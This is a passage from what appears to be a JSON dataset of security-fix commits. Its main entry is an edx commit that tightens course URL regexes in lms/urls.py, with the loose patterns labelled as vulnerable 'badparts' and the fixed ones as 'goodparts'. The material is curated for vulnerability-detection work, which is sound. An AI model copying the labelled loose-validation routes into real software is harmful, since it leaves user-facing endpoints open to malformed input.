self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"
                }
            },
            "msg": "Enable VERIFY_XSS checking by default."
        }
    },
    "https://github.com/Dalas/edx": {
        "4e4c209ae3deb4c78bcec89c181516af8604b450": {
            "url": "https://api.github.com/repos/Dalas/edx/commits/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "html_url": "https://github.com/Dalas/edx/commit/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
                            "add": 12,
                            "remove": 12,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.html_index'),"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.html_index', name=\"html_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
